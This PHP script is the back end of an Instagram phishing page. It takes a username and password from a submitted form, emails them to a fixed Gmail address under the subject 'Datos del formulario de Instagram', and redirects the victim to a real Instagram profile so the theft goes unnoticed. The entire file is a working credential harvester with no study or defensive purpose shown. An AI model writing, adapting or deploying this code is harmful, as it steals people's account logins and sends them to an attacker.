<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $mail = new PHPMailer(true);
    try {
        // Configuración del servidor SMTP
        $mail->isSMTP();
        $mail->Host = 'smtp.tuservidor.com'; // Reemplaza con el host SMTP de tu proveedor
        $mail->SMTPAuth = true;
        $mail->Username = 'tu_correo@tuservidor.com'; // Tu correo
        $mail->Password = 'tu_contraseña'; // Tu contraseña
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Configuración del correo
        $mail->setFrom('no-reply@tuservidor.com', 'No Reply');
        $mail->addAddress('martinhr1303@gmail.com');

        $mail->isHTML(false);
        $mail->Subject = 'Datos del formulario de Instagram';
        $mail->Body    = "Usuario: $username\nContraseña: $password";

        $mail->send();
        header("Location: https://www.instagram.com/m.hernandezz3/");
        exit();
    } catch (Exception $e) {
        echo "Error al enviar el correo: {$mail->ErrorInfo}";
    }
} else {
    echo "Método de solicitud no válido.";
}
?>
